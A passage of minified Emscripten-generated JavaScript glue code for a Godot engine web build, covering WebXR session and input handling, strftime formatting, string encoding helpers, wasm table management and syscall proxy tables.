i=0;i<16;i++)GodotRuntime.setHeapValue(r_transform+4*i,matrix[i],"float");return!0}function _godot_webxr_get_velocity_texture(){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(61,1);const subimage=GodotWebXR.getSubImage();return null===subimage?0:subimage.motionVectorTexture?GodotWebXR.getTextureId(subimage.motionVectorTexture):0}function _godot_webxr_get_view_count(){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(62,1);if(!GodotWebXR.session||!GodotWebXR.pose)return 1;const view_count=GodotWebXR.pose.views.length;return view_count>0?view_count:1}function _godot_webxr_get_visibility_state(){return ENVIRONMENT_IS_PTHREAD?_emscripten_proxy_to_main_thread_js(63,1):GodotWebXR.session&&GodotWebXR.session.visibilityState?GodotRuntime.allocString(GodotWebXR.session.visibilityState):0}function _godot_webxr_initialize(p_session_mode,p_required_features,p_optional_features,p_requested_reference_spaces,p_on_session_started,p_on_session_ended,p_on_session_failed,p_on_input_event,p_on_simple_event){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(64,1,p_session_mode,p_required_features,p_optional_features,p_requested_reference_spaces,p_on_session_started,p_on_session_ended,p_on_session_failed,p_on_input_event,p_on_simple_event);GodotWebXR.monkeyPatchRequestAnimationFrame(!0);const session_mode=GodotRuntime.parseString(p_session_mode),required_features=GodotRuntime.parseString(p_required_features).split(",").map((s=>s.trim())).filter((s=>""!==s)),optional_features=GodotRuntime.parseString(p_optional_features).split(",").map((s=>s.trim())).filter((s=>""!==s)),requested_reference_space_types=GodotRuntime.parseString(p_requested_reference_spaces).split(",").map((s=>s.trim())),onstarted=GodotRuntime.get_func(p_on_session_started),onended=GodotRuntime.get_func(p_on_session_ended),onfailed=GodotRuntime.get_func(p_on_session_failed),oninputevent=GodotRuntime.get_func(p_on_input_event),onsimpleevent=GodotRuntime.get_func(p_on_simple_event),session_init={};required_features.length>0&&(session_init.requiredFeatures=required_features),optional_features.length>0&&(session_init.optionalFeatures=optional_features),navigator.xr.requestSession(session_mode,session_init).then((function(session){GodotWebXR.session=session,session.addEventListener("end",(function(evt){onended()})),session.addEventListener("inputsourceschange",(function(evt){evt.added.forEach(GodotWebXR.addInputSource),evt.removed.forEach(GodotWebXR.removeInputSource)})),["selectstart","selectend","squeezestart","squeezeend"].forEach(((input_event,index)=>{session.addEventListener(input_event,(function(evt){GodotWebXR.frame=evt.frame,oninputevent(index,GodotWebXR.getInputSourceId(evt.inputSource)),GodotWebXR.frame=null}))})),session.addEventListener("visibilitychange",(function(evt){const c_str=GodotRuntime.allocString("visibility_state_changed");onsimpleevent(c_str),GodotRuntime.free(c_str)})),GodotWebXR.onsimpleevent=onsimpleevent;const gl_context_handle=_emscripten_webgl_get_current_context(),gl=GL.getContext(gl_context_handle).GLctx;GodotWebXR.gl=gl,gl.makeXRCompatible().then((function(){GodotWebXR.gl_binding=new XRWebGLBinding(session,gl),GodotWebXR.getLayer(),function requestReferenceSpace(){const reference_space_type=requested_reference_space_types.shift();session.requestReferenceSpace(reference_space_type).then((refSpace=>{!function onReferenceSpaceSuccess(reference_space,reference_space_type){GodotWebXR.space=reference_space,reference_space.onreset=function(evt){const c_str=GodotRuntime.allocString("reference_space_reset");onsimpleevent(c_str),GodotRuntime.free(c_str)},GodotWebXR.pauseResumeMainLoop(),window.setTimeout((function(){const c_str=GodotRuntime.allocString(reference_space_type);onstarted(c_str),GodotRuntime.free(c_str)}),0)}(refSpace,reference_space_type)})).catch((()=>{if(0===requested_reference_space_types.length){const c_str=GodotRuntime.allocString("Unable to get any of the requested reference space types");onfailed(c_str),GodotRuntime.free(c_str)}else requestReferenceSpace()}))}()})).catch((function(error){const c_str=GodotRuntime.allocString(`Unable to make WebGL context compatible with WebXR: ${error}`);onfailed(c_str),GodotRuntime.free(c_str)}))})).catch((function(error){const c_str=GodotRuntime.allocString(`Unable to start session: ${error}`);onfailed(c_str),GodotRuntime.free(c_str)}))}function _godot_webxr_is_session_supported(p_session_mode,p_callback){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(65,1,p_session_mode,p_callback);const session_mode=GodotRuntime.parseString(p_session_mode),cb=GodotRuntime.get_func(p_callback);if(navigator.xr)navigator.xr.isSessionSupported(session_mode).then((function(supported){const c_str=GodotRuntime.allocString(session_mode);cb(c_str,supported?1:0),GodotRuntime.free(c_str)}));else{const c_str=GodotRuntime.allocString(session_mode);cb(c_str,0),GodotRuntime.free(c_str)}}function _godot_webxr_is_supported(){return ENVIRONMENT_IS_PTHREAD?_emscripten_proxy_to_main_thread_js(66,1):!!navigator.xr}function _godot_webxr_uninitialize(){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(67,1);GodotWebXR.session&&GodotWebXR.session.end().catch((e=>{})),GodotWebXR.session=null,GodotWebXR.gl_binding=null,GodotWebXR.layer=null,GodotWebXR.space=null,GodotWebXR.frame=null,GodotWebXR.pose=null,GodotWebXR.view_count=1,GodotWebXR.input_sources=new Array(16),GodotWebXR.touches=new Array(5),GodotWebXR.onsimpleevent=null,GodotWebXR.monkeyPatchRequestAnimationFrame(!1),GodotWebXR.pauseResumeMainLoop()}function _godot_webxr_update_input_source(p_input_source_id,r_target_pose,r_target_ray_mode,r_touch_index,r_has_grip_pose,r_grip_pose,r_has_standard_mapping,r_button_count,r_buttons,r_axes_count,r_axes){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(68,1,p_input_source_id,r_target_pose,r_target_ray_mode,r_touch_index,r_has_grip_pose,r_grip_pose,r_has_standard_mapping,r_button_count,r_buttons,r_axes_count,r_axes);if(!GodotWebXR.session||!GodotWebXR.frame)return 0;if(p_input_source_id<0||p_input_source_id>=GodotWebXR.input_sources.length||!GodotWebXR.input_sources[p_input_source_id])return!1;const input_source=GodotWebXR.input_sources[p_input_source_id],frame=GodotWebXR.frame,space=GodotWebXR.space,target_pose=frame.getPose(input_source.targetRaySpace,space);if(!target_pose)return!1;const target_pose_matrix=target_pose.transform.matrix;for(let i=0;i<16;i++)GodotRuntime.setHeapValue(r_target_pose+4*i,target_pose_matrix[i],"float");let target_ray_mode=0;switch(input_source.targetRayMode){case"gaze":target_ray_mode=1;break;case"tracked-pointer":target_ray_mode=2;break;case"screen":target_ray_mode=3}GodotRuntime.setHeapValue(r_target_ray_mode,target_ray_mode,"i32"),GodotRuntime.setHeapValue(r_touch_index,GodotWebXR.getTouchIndex(input_source),"i32");let has_grip_pose=!1;if(input_source.gripSpace){const grip_pose=frame.getPose(input_source.gripSpace,space);if(grip_pose){const grip_pose_matrix=grip_pose.transform.matrix;for(let i=0;i<16;i++)GodotRuntime.setHeapValue(r_grip_pose+4*i,grip_pose_matrix[i],"float");has_grip_pose=!0}}GodotRuntime.setHeapValue(r_has_grip_pose,has_grip_pose?1:0,"i32");let has_standard_mapping=!1,button_count=0,axes_count=0;if(input_source.gamepad){"xr-standard"===input_source.gamepad.mapping&&(has_standard_mapping=!0),button_count=Math.min(input_source.gamepad.buttons.length,10);for(let i=0;i<button_count;i++)GodotRuntime.setHeapValue(r_buttons+4*i,input_source.gamepad.buttons[i].value,"float");axes_count=Math.min(input_source.gamepad.axes.length,10);for(let i=0;i<axes_count;i++)GodotRuntime.setHeapValue(r_axes+4*i,input_source.gamepad.axes[i],"float")}return GodotRuntime.setHeapValue(r_has_standard_mapping,has_standard_mapping?1:0,"i32"),GodotRuntime.setHeapValue(r_button_count,button_count,"i32"),GodotRuntime.setHeapValue(r_axes_count,axes_count,"i32"),!0}function _godot_webxr_update_target_frame_rate(p_frame_rate){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(69,1,p_frame_rate);GodotWebXR.session&&void 0!==GodotWebXR.session.updateTargetFrameRate&&GodotWebXR.session.updateTargetFrameRate(p_frame_rate).then((()=>{const c_str=GodotRuntime.allocString("display_refresh_rate_changed");GodotWebXR.onsimpleevent(c_str),GodotRuntime.free(c_str)}))}function _setTempRet0(val){setTempRet0(val)}function __isLeapYear(year){return year%4==0&&(year%100!=0||year%400==0)}function __arraySum(array,index){for(var sum=0,i=0;i<=index;sum+=array[i++]);return sum}var __MONTH_DAYS_LEAP=[31,29,31,30,31,30,31,31,30,31,30,31],__MONTH_DAYS_REGULAR=[31,28,31,30,31,30,31,31,30,31,30,31];function __addDays(date,days){for(var newDate=new Date(date.getTime());days>0;){var leap=__isLeapYear(newDate.getFullYear()),currentMonth=newDate.getMonth(),daysInCurrentMonth=(leap?__MONTH_DAYS_LEAP:__MONTH_DAYS_REGULAR)[currentMonth];if(!(days>daysInCurrentMonth-newDate.getDate()))return newDate.setDate(newDate.getDate()+days),newDate;days-=daysInCurrentMonth-newDate.getDate()+1,newDate.setDate(1),currentMonth<11?newDate.setMonth(currentMonth+1):(newDate.setMonth(0),newDate.setFullYear(newDate.getFullYear()+1))}return newDate}function _strftime(s,maxsize,format,tm){var tm_zone=GROWABLE_HEAP_I32()[tm+40>>2],date={tm_sec:GROWABLE_HEAP_I32()[tm>>2],tm_min:GROWABLE_HEAP_I32()[tm+4>>2],tm_hour:GROWABLE_HEAP_I32()[tm+8>>2],tm_mday:GROWABLE_HEAP_I32()[tm+12>>2],tm_mon:GROWABLE_HEAP_I32()[tm+16>>2],tm_year:GROWABLE_HEAP_I32()[tm+20>>2],tm_wday:GROWABLE_HEAP_I32()[tm+24>>2],tm_yday:GROWABLE_HEAP_I32()[tm+28>>2],tm_isdst:GROWABLE_HEAP_I32()[tm+32>>2],tm_gmtoff:GROWABLE_HEAP_I32()[tm+36>>2],tm_zone:tm_zone?UTF8ToString(tm_zone):""},pattern=UTF8ToString(format),EXPANSION_RULES_1={"%c":"%a %b %d %H:%M:%S %Y","%D":"%m/%d/%y","%F":"%Y-%m-%d","%h":"%b","%r":"%I:%M:%S %p","%R":"%H:%M","%T":"%H:%M:%S","%x":"%m/%d/%y","%X":"%H:%M:%S","%Ec":"%c","%EC":"%C","%Ex":"%m/%d/%y","%EX":"%H:%M:%S","%Ey":"%y","%EY":"%Y","%Od":"%d","%Oe":"%e","%OH":"%H","%OI":"%I","%Om":"%m","%OM":"%M","%OS":"%S","%Ou":"%u","%OU":"%U","%OV":"%V","%Ow":"%w","%OW":"%W","%Oy":"%y"};for(var rule in EXPANSION_RULES_1)pattern=pattern.replace(new RegExp(rule,"g"),EXPANSION_RULES_1[rule]);var WEEKDAYS=["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],MONTHS=["January","February","March","April","May","June","July","August","September","October","November","December"];function leadingSomething(value,digits,character){for(var str="number"==typeof value?value.toString():value||"";str.length<digits;)str=character[0]+str;return str}function leadingNulls(value,digits){return leadingSomething(value,digits,"0")}function compareByDay(date1,date2){function sgn(value){return value<0?-1:value>0?1:0}var compare;return 0===(compare=sgn(date1.getFullYear()-date2.getFullYear()))&&0===(compare=sgn(date1.getMonth()-date2.getMonth()))&&(compare=sgn(date1.getDate()-date2.getDate())),compare}function getFirstWeekStartDate(janFourth){switch(janFourth.getDay()){case 0:return new Date(janFourth.getFullYear()-1,11,29);case 1:return janFourth;case 2:return new Date(janFourth.getFullYear(),0,3);case 3:return new Date(janFourth.getFullYear(),0,2);case 4:return new Date(janFourth.getFullYear(),0,1);case 5:return new Date(janFourth.getFullYear()-1,11,31);case 6:return new Date(janFourth.getFullYear()-1,11,30)}}function getWeekBasedYear(date){var thisDate=__addDays(new Date(date.tm_year+1900,0,1),date.tm_yday),janFourthThisYear=new Date(thisDate.getFullYear(),0,4),janFourthNextYear=new Date(thisDate.getFullYear()+1,0,4),firstWeekStartThisYear=getFirstWeekStartDate(janFourthThisYear),firstWeekStartNextYear=getFirstWeekStartDate(janFourthNextYear);return compareByDay(firstWeekStartThisYear,thisDate)<=0?compareByDay(firstWeekStartNextYear,thisDate)<=0?thisDate.getFullYear()+1:thisDate.getFullYear():thisDate.getFullYear()-1}var EXPANSION_RULES_2={"%a":function(date){return WEEKDAYS[date.tm_wday].substring(0,3)},"%A":function(date){return WEEKDAYS[date.tm_wday]},"%b":function(date){return MONTHS[date.tm_mon].substring(0,3)},"%B":function(date){return MONTHS[date.tm_mon]},"%C":function(date){return leadingNulls((date.tm_year+1900)/100|0,2)},"%d":function(date){return leadingNulls(date.tm_mday,2)},"%e":function(date){return leadingSomething(date.tm_mday,2," ")},"%g":function(date){return getWeekBasedYear(date).toString().substring(2)},"%G":function(date){return getWeekBasedYear(date)},"%H":function(date){return leadingNulls(date.tm_hour,2)},"%I":function(date){var twelveHour=date.tm_hour;return 0==twelveHour?twelveHour=12:twelveHour>12&&(twelveHour-=12),leadingNulls(twelveHour,2)},"%j":function(date){return leadingNulls(date.tm_mday+__arraySum(__isLeapYear(date.tm_year+1900)?__MONTH_DAYS_LEAP:__MONTH_DAYS_REGULAR,date.tm_mon-1),3)},"%m":function(date){return leadingNulls(date.tm_mon+1,2)},"%M":function(date){return leadingNulls(date.tm_min,2)},"%n":function(){return"\n"},"%p":function(date){return date.tm_hour>=0&&date.tm_hour<12?"AM":"PM"},"%S":function(date){return leadingNulls(date.tm_sec,2)},"%t":function(){return"\t"},"%u":function(date){return date.tm_wday||7},"%U":function(date){var days=date.tm_yday+7-date.tm_wday;return leadingNulls(Math.floor(days/7),2)},"%V":function(date){var val=Math.floor((date.tm_yday+7-(date.tm_wday+6)%7)/7);if((date.tm_wday+371-date.tm_yday-2)%7<=2&&val++,val){if(53==val){var jan1=(date.tm_wday+371-date.tm_yday)%7;4==jan1||3==jan1&&__isLeapYear(date.tm_year)||(val=1)}}else{val=52;var dec31=(date.tm_wday+7-date.tm_yday-1)%7;(4==dec31||5==dec31&&__isLeapYear(date.tm_year%400-1))&&val++}return leadingNulls(val,2)},"%w":function(date){return date.tm_wday},"%W":function(date){var days=date.tm_yday+7-(date.tm_wday+6)%7;return leadingNulls(Math.floor(days/7),2)},"%y":function(date){return(date.tm_year+1900).toString().substring(2)},"%Y":function(date){return date.tm_year+1900},"%z":function(date){var off=date.tm_gmtoff,ahead=off>=0;return off=(off=Math.abs(off)/60)/60*100+off%60,(ahead?"+":"-")+String("0000"+off).slice(-4)},"%Z":function(date){return date.tm_zone},"%%":function(){return"%"}};for(var rule in pattern=pattern.replace(/%%/g,"\0\0"),EXPANSION_RULES_2)pattern.includes(rule)&&(pattern=pattern.replace(new RegExp(rule,"g"),EXPANSION_RULES_2[rule](date)));var bytes=intArrayFromString(pattern=pattern.replace(/\0\0/g,"%"),!1);return bytes.length>maxsize?0:(writeArrayToMemory(bytes,s),bytes.length-1)}function _strftime_l(s,maxsize,format,tm){return _strftime(s,maxsize,format,tm)}function allocateUTF8OnStack(str){var size=lengthBytesUTF8(str)+1,ret=stackAlloc(size);return stringToUTF8Array(str,GROWABLE_HEAP_I8(),ret,size),ret}function uleb128Encode(n,target){assert(n<16384),n<128?target.push(n):target.push(n%128|128,n>>7)}function sigToWasmTypes(sig){for(var typeNames={i:"i32",j:"i64",f:"f32",d:"f64",p:"i32"},type={parameters:[],results:"v"==sig[0]?[]:[typeNames[sig[0]]]},i=1;i<sig.length;++i)assert(sig[i]in typeNames,"invalid signature char: "+sig[i]),type.parameters.push(typeNames[sig[i]]);return type}function convertJsFunctionToWasm(func,sig){if("function"==typeof WebAssembly.Function)return new WebAssembly.Function(sigToWasmTypes(sig),func);var typeSectionBody=[1,96],sigRet=sig.slice(0,1),sigParam=sig.slice(1),typeCodes={i:127,p:127,j:126,f:125,d:124};uleb128Encode(sigParam.length,typeSectionBody);for(var i=0;i<sigParam.length;++i)assert(sigParam[i]in typeCodes,"invalid signature char: "+sigParam[i]),typeSectionBody.push(typeCodes[sigParam[i]]);"v"==sigRet?typeSectionBody.push(0):typeSectionBody.push(1,typeCodes[sigRet]);var bytes=[0,97,115,109,1,0,0,0,1];uleb128Encode(typeSectionBody.length,bytes),bytes.push.apply(bytes,typeSectionBody),bytes.push(2,7,1,1,101,1,102,0,0,7,5,1,1,102,0,0);var module=new WebAssembly.Module(new Uint8Array(bytes));return new WebAssembly.Instance(module,{e:{f:func}}).exports.f}function updateTableMap(offset,count){if(functionsInTableMap)for(var i=offset;i<offset+count;i++){var item=getWasmTableEntry(i);item&&functionsInTableMap.set(item,i)}}var functionsInTableMap=void 0,freeTableIndexes=[];function getEmptyTableSlot(){if(freeTableIndexes.length)return freeTableIndexes.pop();try{wasmTable.grow(1)}catch(err){if(!(err instanceof RangeError))throw err;throw"Unable to grow wasm table. Set ALLOW_TABLE_GROWTH."}return wasmTable.length-1}function setWasmTableEntry(idx,func){wasmTable.set(idx,func),wasmTableMirror[idx]=wasmTable.get(idx)}function addFunction(func,sig){if(assert(void 0!==func),functionsInTableMap||(functionsInTableMap=new WeakMap,updateTableMap(0,wasmTable.length)),functionsInTableMap.has(func))return functionsInTableMap.get(func);var ret=getEmptyTableSlot();try{setWasmTableEntry(ret,func)}catch(err){if(!(err instanceof TypeError))throw err;assert(void 0!==sig,"Missing signature argument to addFunction: "+func),setWasmTableEntry(ret,convertJsFunctionToWasm(func,sig))}return functionsInTableMap.set(func,ret),ret}function removeFunction(index){functionsInTableMap.delete(getWasmTableEntry(index)),freeTableIndexes.push(index)}var ALLOC_NORMAL=0,ALLOC_STACK=1;function allocate(slab,allocator){var ret;return assert("number"==typeof allocator,"allocate no longer takes a type argument"),assert("number"!=typeof slab,"allocate no longer takes a number as arg0"),ret=allocator==ALLOC_STACK?stackAlloc(slab.length):_malloc(slab.length),slab.subarray||slab.slice||(slab=new Uint8Array(slab)),GROWABLE_HEAP_U8().set(slab,ret),ret}function AsciiToString(ptr){for(var str="";;){var ch=GROWABLE_HEAP_U8()[ptr++>>0];if(!ch)return str;str+=String.fromCharCode(ch)}}function stringToAscii(str,outPtr){return writeAsciiToMemory(str,outPtr,!1)}var UTF16Decoder="undefined"!=typeof TextDecoder?new TextDecoder("utf-16le"):void 0;function UTF16ToString(ptr,maxBytesToRead){assert(ptr%2==0,"Pointer passed to UTF16ToString must be aligned to two bytes!");for(var endPtr=ptr,idx=endPtr>>1,maxIdx=idx+maxBytesToRead/2;!(idx>=maxIdx)&&GROWABLE_HEAP_U16()[idx];)++idx;if((endPtr=idx<<1)-ptr>32&&UTF16Decoder)return UTF16Decoder.decode(GROWABLE_HEAP_U8().slice(ptr,endPtr));for(var str="",i=0;!(i>=maxBytesToRead/2);++i){var codeUnit=GROWABLE_HEAP_I16()[ptr+2*i>>1];if(0==codeUnit)break;str+=String.fromCharCode(codeUnit)}return str}function stringToUTF16(str,outPtr,maxBytesToWrite){if(assert(outPtr%2==0,"Pointer passed to stringToUTF16 must be aligned to two bytes!"),assert("number"==typeof maxBytesToWrite,"stringToUTF16(str, outPtr, maxBytesToWrite) is missing the third parameter that specifies the length of the output buffer!"),void 0===maxBytesToWrite&&(maxBytesToWrite=2147483647),maxBytesToWrite<2)return 0;for(var startPtr=outPtr,numCharsToWrite=(maxBytesToWrite-=2)<2*str.length?maxBytesToWrite/2:str.length,i=0;i<numCharsToWrite;++i){var codeUnit=str.charCodeAt(i);GROWABLE_HEAP_I16()[outPtr>>1]=codeUnit,outPtr+=2}return GROWABLE_HEAP_I16()[outPtr>>1]=0,outPtr-startPtr}function lengthBytesUTF16(str){return 2*str.length}function UTF32ToString(ptr,maxBytesToRead){assert(ptr%4==0,"Pointer passed to UTF32ToString must be aligned to four bytes!");for(var i=0,str="";!(i>=maxBytesToRead/4);){var utf32=GROWABLE_HEAP_I32()[ptr+4*i>>2];if(0==utf32)break;if(++i,utf32>=65536){var ch=utf32-65536;str+=String.fromCharCode(55296|ch>>10,56320|1023&ch)}else str+=String.fromCharCode(utf32)}return str}function stringToUTF32(str,outPtr,maxBytesToWrite){if(assert(outPtr%4==0,"Pointer passed to stringToUTF32 must be aligned to four bytes!"),assert("number"==typeof maxBytesToWrite,"stringToUTF32(str, outPtr, maxBytesToWrite) is missing the third parameter that specifies the length of the output buffer!"),void 0===maxBytesToWrite&&(maxBytesToWrite=2147483647),maxBytesToWrite<4)return 0;for(var startPtr=outPtr,endPtr=startPtr+maxBytesToWrite-4,i=0;i<str.length;++i){var codeUnit=str.charCodeAt(i);if(codeUnit>=55296&&codeUnit<=57343)codeUnit=65536+((1023&codeUnit)<<10)|1023&str.charCodeAt(++i);if(GROWABLE_HEAP_I32()[outPtr>>2]=codeUnit,(outPtr+=4)+4>endPtr)break}return GROWABLE_HEAP_I32()[outPtr>>2]=0,outPtr-startPtr}function lengthBytesUTF32(str){for(var len=0,i=0;i<str.length;++i){var codeUnit=str.charCodeAt(i);codeUnit>=55296&&codeUnit<=57343&&++i,len+=4}return len}function writeStringToMemory(string,buffer,dontAddNull){var lastChar,end;warnOnce("writeStringToMemory is deprecated and should not be called! Use stringToUTF8() instead!"),dontAddNull&&(end=buffer+lengthBytesUTF8(string),lastChar=GROWABLE_HEAP_I8()[end]),stringToUTF8(string,buffer,1/0),dontAddNull&&(GROWABLE_HEAP_I8()[end]=lastChar)}function intArrayToString(array){for(var ret=[],i=0;i<array.length;i++){var chr=array[i];chr>255&&(ASSERTIONS&&assert(!1,"Character code "+chr+" ("+String.fromCharCode(chr)+")  at offset "+i+" not in 0x00-0xFF."),chr&=255),ret.push(String.fromCharCode(chr))}return ret.join("")}function getCFunc(ident){var func=Module["_"+ident];return assert(func,"Cannot call unknown function "+ident+", make sure it is exported"),func}function ccall(ident,returnType,argTypes,args,opts){var toC={string:str=>{var ret=0;if(null!=str&&0!==str){var len=1+(str.length<<2);stringToUTF8(str,ret=stackAlloc(len),len)}return ret},array:arr=>{var ret=stackAlloc(arr.length);return writeArrayToMemory(arr,ret),ret}};var func=getCFunc(ident),cArgs=[],stack=0;if(assert("array"!==returnType,'Return type should not be "array".'),args)for(var i=0;i<args.length;i++){var converter=toC[argTypes[i]];converter?(0===stack&&(stack=stackSave()),cArgs[i]=converter(args[i])):cArgs[i]=args[i]}var ret=func.apply(null,cArgs);return ret=function onDone(ret){return 0!==stack&&stackRestore(stack),function convertReturnValue(ret){return"string"===returnType?UTF8ToString(ret):"boolean"===returnType?Boolean(ret):ret}(ret)}(ret)}function cwrap(ident,returnType,argTypes,opts){return function(){return ccall(ident,returnType,argTypes,arguments,opts)}}PThread.init();var FSNode=function(parent,name,mode,rdev){parent||(parent=this),this.parent=parent,this.mount=parent.mount,this.mounted=null,this.id=FS.nextInode++,this.name=name,this.mode=mode,this.node_ops={},this.stream_ops={},this.rdev=rdev},readMode=365,writeMode=146;Object.defineProperties(FSNode.prototype,{read:{get:function(){return(this.mode&readMode)===readMode},set:function(val){val?this.mode|=readMode:this.mode&=~readMode}},write:{get:function(){return(this.mode&writeMode)===writeMode},set:function(val){val?this.mode|=writeMode:this.mode&=~writeMode}},isFolder:{get:function(){return FS.isDir(this.mode)}},isDevice:{get:function(){return FS.isChrdev(this.mode)}}}),FS.FSNode=FSNode,FS.staticInit(),ERRNO_CODES={EPERM:63,ENOENT:44,ESRCH:71,EINTR:27,EIO:29,ENXIO:60,E2BIG:1,ENOEXEC:45,EBADF:8,ECHILD:12,EAGAIN:6,EWOULDBLOCK:6,ENOMEM:48,EACCES:2,EFAULT:21,ENOTBLK:105,EBUSY:10,EEXIST:20,EXDEV:75,ENODEV:43,ENOTDIR:54,EISDIR:31,EINVAL:28,ENFILE:41,EMFILE:33,ENOTTY:59,ETXTBSY:74,EFBIG:22,ENOSPC:51,ESPIPE:70,EROFS:69,EMLINK:34,EPIPE:64,EDOM:18,ERANGE:68,ENOMSG:49,EIDRM:24,ECHRNG:106,EL2NSYNC:156,EL3HLT:107,EL3RST:108,ELNRNG:109,EUNATCH:110,ENOCSI:111,EL2HLT:112,EDEADLK:16,ENOLCK:46,EBADE:113,EBADR:114,EXFULL:115,ENOANO:104,EBADRQC:103,EBADSLT:102,EDEADLOCK:16,EBFONT:101,ENOSTR:100,ENODATA:116,ETIME:117,ENOSR:118,ENONET:119,ENOPKG:120,EREMOTE:121,ENOLINK:47,EADV:122,ESRMNT:123,ECOMM:124,EPROTO:65,EMULTIHOP:36,EDOTDOT:125,EBADMSG:9,ENOTUNIQ:126,EBADFD:127,EREMCHG:128,ELIBACC:129,ELIBBAD:130,ELIBSCN:131,ELIBMAX:132,ELIBEXEC:133,ENOSYS:52,ENOTEMPTY:55,ENAMETOOLONG:37,ELOOP:32,EOPNOTSUPP:138,EPFNOSUPPORT:139,ECONNRESET:15,ENOBUFS:42,EAFNOSUPPORT:5,EPROTOTYPE:67,ENOTSOCK:57,ENOPROTOOPT:50,ESHUTDOWN:140,ECONNREFUSED:14,EADDRINUSE:3,ECONNABORTED:13,ENETUNREACH:40,ENETDOWN:38,ETIMEDOUT:73,EHOSTDOWN:142,EHOSTUNREACH:23,EINPROGRESS:26,EALREADY:7,EDESTADDRREQ:17,EMSGSIZE:35,EPROTONOSUPPORT:66,ESOCKTNOSUPPORT:137,EADDRNOTAVAIL:4,ENETRESET:39,EISCONN:30,ENOTCONN:53,ETOOMANYREFS:141,EUSERS:136,EDQUOT:19,ESTALE:72,ENOTSUP:138,ENOMEDIUM:148,EILSEQ:25,EOVERFLOW:61,ECANCELED:11,ENOTRECOVERABLE:56,EOWNERDEAD:62,ESTRPIPE:135},Module.requestFullscreen=function Module_requestFullscreen(lockPointer,resizeCanvas){Browser.requestFullscreen(lockPointer,resizeCanvas)},Module.requestFullScreen=function Module_requestFullScreen(){Browser.requestFullScreen()},Module.requestAnimationFrame=function Module_requestAnimationFrame(func){Browser.requestAnimationFrame(func)},Module.setCanvasSize=function Module_setCanvasSize(width,height,noUpdates){Browser.setCanvasSize(width,height,noUpdates)},Module.pauseMainLoop=function Module_pauseMainLoop(){Browser.mainLoop.pause()},Module.resumeMainLoop=function Module_resumeMainLoop(){Browser.mainLoop.resume()},Module.getUserMedia=function Module_getUserMedia(){Browser.getUserMedia()},Module.createContext=function Module_createContext(canvas,useWebGL,setInModule,webGLContextAttributes){return Browser.createContext(canvas,useWebGL,setInModule,webGLContextAttributes)};for(var preloadedImages={},preloadedAudios={},GLctx,__miniTempWebGLIntBuffersStorage=new Int32Array(288),i=0;i<288;++i)__miniTempWebGLIntBuffers[i]=__miniTempWebGLIntBuffersStorage.subarray(0,i+1);for(var miniTempWebGLFloatBuffersStorage=new Float32Array(288),i=0;i<288;++i)miniTempWebGLFloatBuffers[i]=miniTempWebGLFloatBuffersStorage.subarray(0,i+1);Module.request_quit=function(){GodotOS.request_quit()},Module.onExit=GodotOS.cleanup,GodotOS._fs_sync_promise=Promise.resolve(),Module.initConfig=GodotConfig.init_config,Module.initFS=GodotFS.init,Module.copyToFS=GodotFS.copy_to_fs,GodotOS.atexit((function(resolve,reject){GodotDisplayCursor.clear(),resolve()})),GodotOS.atexit((function(resolve,reject){GodotEventListeners.clear(),resolve()})),GodotOS.atexit((function(resolve,reject){GodotDisplayVK.clear(),resolve()})),GodotJSWrapper.proxies=new Map;var proxiedFunctionTable=[null,_proc_exit,exitOnMainThread,pthreadCreateProxied,___syscall__newselect,___syscall_accept4,___syscall_bind,___syscall_chdir,___syscall_chmod,___syscall_connect,___syscall_faccessat,___syscall_fchmod,___syscall_fcntl64,___syscall_getcwd,___syscall_getdents64,___syscall_getsockname,___syscall_getsockopt,___syscall_ioctl,___syscall_listen,___syscall_lstat64,___syscall_mkdirat,___syscall_newfstatat,___syscall_openat,___syscall_poll,___syscall_readlinkat,___syscall_recvfrom,___syscall_renameat,___syscall_rmdir,___syscall_sendto,___syscall_socket,___syscall_stat64,___syscall_statfs64,___syscall_symlink,___syscall_unlinkat,__mmap_js,__munmap_js,_tzset_impl,_emscripten_force_exit,_emscripten_webgl_destroy_context,_emscripten_webgl_create_context_proxied,_emscripten_webgl_enable_extension,_environ_get,_environ_sizes_get,_fd_close,_fd_fdstat_get,_fd_read,_fd_seek,_fd_write,_getaddrinfo,_godot_audio_input_start,_godot_audio_input_stop,_godot_audio_is_available,_godot_webgl2_glFramebufferTextureMultiviewOVR,_godot_webxr_get_bounds_geometry,_godot_webxr_get_color_texture,_godot_webxr_get_depth_texture,_godot_webxr_get_frame_rate,_godot_webxr_get_projection_for_view,_godot_webxr_get_render_target_size,_godot_webxr_get_supported_frame_rates,_godot_webxr_get_transform_for_view,_godot_webxr_get_velocity_texture,_godot_webxr_get_view_count,_godot_webxr_get_visibility_state,_godot_webxr_initialize,_godot_webxr_is_session_supported,_godot_webxr_is_supported,_godot_webxr_uninitialize,_godot_webxr_update_input_source,_godot_webxr_update_target_frame_rate],ASSERTIONS=!0;function checkIncomingModuleAPI(){ignoredModuleProp("fetchSettings")}var asmLibraryArg={__assert_fail:___assert_fail,__call_sighandler:___call_sighandler,__emscripten_init_main_thread_js:___emscripten_init_main_thread_js,__emscripten_thread_cleanup:___emscripten_thread_cleanup,__pthread_create_js:___pthread_create_js,__syscall__newselect:___syscall__newselect,__syscall_accept4:___syscall_accept4,__syscall_bind:___syscall_bind,__syscall_chdir:___syscall_chdir,__syscall_chmod:___syscall_chmod,__syscall_connect:___syscall_connect,__syscall_faccessat:___syscall_faccessat,__syscall_fchmod:___syscall_fchmod,__syscall_fcntl64:___syscall_fcntl64,__syscall_getcwd:___syscall_getcwd,__syscall_getdents64:___syscall_getdents64,__syscall_getsockname:___syscall_getsockname,__syscall_getsockopt:___syscall_getsockopt,__syscall_ioctl:___syscall_ioctl,__syscall_listen:___syscall_listen,__syscall_lstat64:___syscall_lstat64,__syscall_mkdirat:___syscall_mkdirat,__syscall_newfstatat:___syscall_newfstatat,__syscall_openat:___syscall_openat,__syscall_poll:___syscall_poll,__syscall_readlinkat:___syscall_readlinkat,__syscall_recvfrom:___syscall_recvfrom,__syscall_renameat:___syscall_renameat,__syscall_rmdir:___sy